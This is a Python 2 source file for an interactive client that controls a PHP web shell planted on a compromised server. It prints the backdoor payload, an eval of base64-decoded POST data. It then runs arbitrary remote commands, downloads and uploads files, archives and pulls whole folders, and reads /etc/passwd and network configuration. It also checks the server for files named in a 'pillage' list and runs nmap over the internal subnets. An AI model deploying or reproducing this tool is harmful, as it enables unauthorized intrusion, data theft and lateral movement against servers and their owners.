
import base64
import httplib
from urlparse import urlparse
from cmd import Cmd
import os
import re


def extract_ip_mask_ifconfig(addr_line):
    ip = re.findall(r"inet addr:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", addr_line)
    if ip and len(ip[0].split(":")) > 1:
        ip = ip[0].split(":")[1]
    mask = re.findall(r"Mask:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", addr_line)
    bits = 0
    if mask and len(mask[0].split(":")) > 1:
        mask = mask[0].split(":")[1]
        import math
        octets = mask.split(".")
        for o in octets:
            mo = int(o)
            if mo > 0:
                bits += int(math.log(mo, 2)) + 1
    return (ip, bits)


def is_private_ip(ip):
    octets = ip.split(".")
    f = False
    if len(octets) == 4:
        o1 = int(octets[0])
        o2 = int(octets[1])
        if o1 == 10:
            f = True
        elif o1 == 172 and (o2 >= 16 and o2 <= 31):
            f = True
        elif o1 == 192 and o2 == 168:
            f = True
        elif o1 == 169 and o2 == 254:
            f = True
        else:
            f = False
    return f


class rshell(Cmd):

    pwd = ""
    old_pwd = ""
    ips = {}
    hosts = {}
    width = 80

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def log_data(cmd, data):
        f = open(cmd.split()[0], "w")
        f.write(data)
        f.close()

    def do_help(self, line):
        print "help: Show this message"
        print "payload: show the shell code in php"
        print "download: download remotepath/remotefile localpath/localfile"
        print "upload: upload localpath/localfile remotepath/remotefile"
        print "compress_folder: compress_folder folder_path file.tar.gz"
        print "dwfolder: do_dwfolder folder_path"
        print "getsysinfo: get info about the system"
        print "getswversion: get versions of some software"
        print "check_files: check existence of a list of files (pillage.lst)"
        print "get_local_ips: get local ips and subnet mask bits"
        print "print_local_ips: print local ips finded"
        print "Or write a command to send to the server shell"
        return None

    def default(self, line):
        #This is the default command method
        #system function is called with the command to execute
        cmd = "system('{0}');".format(line)
        #doing the request to the server
        (code, response) = self.dorequest(cmd)
        if code == 200:
            print response

    def emptyline(self):
        print "Deja de darle al enter"

    def do_quit(self, line):
        #Return true to exit in postcmd
        return True

    def postcmd(self, stop, line):
        #This stop cmdloop if returns true
        #check if stop value is true
        #stop is the return value of do_* methods
        if stop:
            return True

    def do_exit(self, line):
        #Return true to exit in postcmd
        return True

    def dorequest(self, phpcmd):
        #Post request using the param parameter
        cmd_base64 = base64.encodestring(phpcmd)[:-1]
        fullurl = self.shell_url
        parsed_url = urlparse(fullurl)
        url = ''
        con = None
        params = "param={0}".format(cmd_base64)
        if self.proxy:
            (ip, port) = self.proxy.split(':')
            con = httplib.HTTPConnection(ip, int(port))
            url = fullurl
        else:
            url = parsed_url.path
            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept": "text/plain"}
        if con:
            con.request('POST', url, params, headers)
            response = con.getresponse()
            if response.status == 200:
                return (response.status, response.read())
            else:
                #
                return (response.status, None)
        else:
            #
            return (None, None)

    def do_shell(self, line):
        #This method execute the command locally
        print os.popen(line).read()
        return None

    def do_payload(self, line):
        self.print_payload()
        return None

    def do_phpinfo(self, line):
        #This is the default command method
        #system function is called with the command to execute
        #doing the request to the server
        cmd = "phpinfo();"
        (code, data) = self.dorequest(cmd)
        if code == 200:
            phpinfofilename = "phpinfo.html"
            f = file(phpinfofilename, "w")
            f.write(data)
            f.close()
            resp = raw_input("Open in default browser? (y/n): ")
            if (resp == "y"):
                import webbrowser
                webbrowser.open(phpinfofilename)
        else:
            print "Error"
        return None

    def print_payload(self):
        print "<?php eval(base64_decode($_POST['param'])); ?>"

    def do_download(self, line):
        files = line.split()
        #Return file contents encoded in base 64
        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
        (code, data) = self.dorequest(cmd)
        if code == 200:
            f = file(os.path.basename(files[0]), "w")
            #Decode data and write it in a file
            f.write(base64.decodestring(data))
            f.close()
        else:
            print "Error"
        return None

    def do_upload(self, line):
        (filename, destination) = line.split()
        f = file(filename)
        fname = os.path.basename(filename)
        #Encode file data in base 64
        data = base64.encodestring(f.read()).replace("\n", "")
        f.close()
        #Building the command in remote server to decode base 64
        # and write the data in the file
        cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));"
        (code, data) = self.dorequest(cmd.format(destination, fname, data))
        if code == 200:
            print data
        else:
            print "Error"
        return None

    def do_compress_folder(self, line):
        (folder, archivo) = line.split()
        cmd = "tar -czf {0} {1}".format(archivo, folder)
        self.default(cmd)
        return None

    def do_dwfolder(self, line):
        if line[-1:] == "/":
            line = line[-1]
        filename = "{0}.tar.gz".format(os.path.basename(line))
        self.do_compress_folder("{0} {1}".format(line, filename))
        self.do_download("{0} {1}".format(filename, filename))
        return None

    def do_getsysinfo(self, line):
        #Print user and system information
        cmds = {"User name:": "whoami",
                "User id:": "id",
                "/etc/passwd:": "cat /etc/passwd",
                "/etc/issue:": "cat /etc/issue",
                "Host name:": "hostname -f",
                "System information (uname):": "uname -a",
                "Network iterfaces:": "ifconfig -a",
                "/etc/resolv.conf:": "cat /etc/resolv.conf",
                "Hosts ips information /etc/hosts:": "cat /etc/hosts",
                "Open ports": "netstat -ant",
                }
        for k, val in cmds.items():
            print "=" * self.width
            print k
            print "-" * self.width
            self.default(val)
        return None

    def do_getswversion(self, line):
        #Print some software versions
        cmds = {"gcc": "gcc --version",
                "mysql": "mysql --version",
                "perl": "perl -v Returns",
                "ruby": "ruby -v Returns",
                "python": "python --version",
                }
        print "=" * self.width
        print "Software versions:"
        for k, val in cmds.items():
            print "-" * self.width
            self.default(val)
        return None

    def file_exists(self, filename):
        cmd = "if (file_exists('{0}')) echo 1;".format(filename)
        (code, response) = self.dorequest(cmd)
        if code == 200:
            if response.replace("\n", "") == "1":
                print filename + " exist"
        else:
            print "Error"

    def do_check_files(self, line):
        filelist = file("pillage.lst")
        for filename in filelist:
            #Check filename, [:-1] to remove eol from readline
            self.file_exists(filename[:-1])
        filelist.close()
        return None

    def do_get_local_ips(self, line):
        cmd = "system('ifconfig -a | grep addr:');"
        (code, response) = self.dorequest(cmd)
        if code == 200:
            if response and response != "":
                addr_list = response.split("\n")
                for addr_line in addr_list:
                    (ip, bits) = extract_ip_mask_ifconfig(addr_line)
                    if ip and bits:
                        self.ips[ip] = {"mask_bits": bits}
                print self.ips
        else:
            print "Error"
        return None

    def do_print_local_ips(self, line):
        for ip, info in self.ips.items():
            print "=" * self.width
            print "{0}:".format(ip)
            print "mask bits: {0}".rjust(16).format(info["mask_bits"])
        return None

    def do_find_hosts(self, line):
        cmd = "nmap "
        if self.ips:
            for ip, info in self.ips.items():
                if not ip.startswith("127."):
                    cmd += "{0}\{1} ".format(ip, info["mask_bits"])
            (code, response) = self.dorequest("system('{0}');".format(cmd))
            if code == 200:
                scans = response.split("Nmap scan report for ")[1:]
                for host in scans:
                    hs = host.split("\n\n")[0]
                    lhs = hs.split("\n")
                    hostname = lhs[0].split()[0]
                    ip = lhs[0].split()[1][1:-1]
                    ports = lhs[4:]
                    self.hosts[ip] = [hostname, ports]
            else:
                print "Error"
        else:
            print "You must run get_local_ips first"
        self.do_print_hosts(None)
        return None

    def do_print_hosts(self, line):
        if line:
            print self.hosts[line.split()[0]]
        else:
            print self.hosts

#    def do_cd(self, line):
#        cmd = "cd ../; pwd"
#        self.default(cmd)
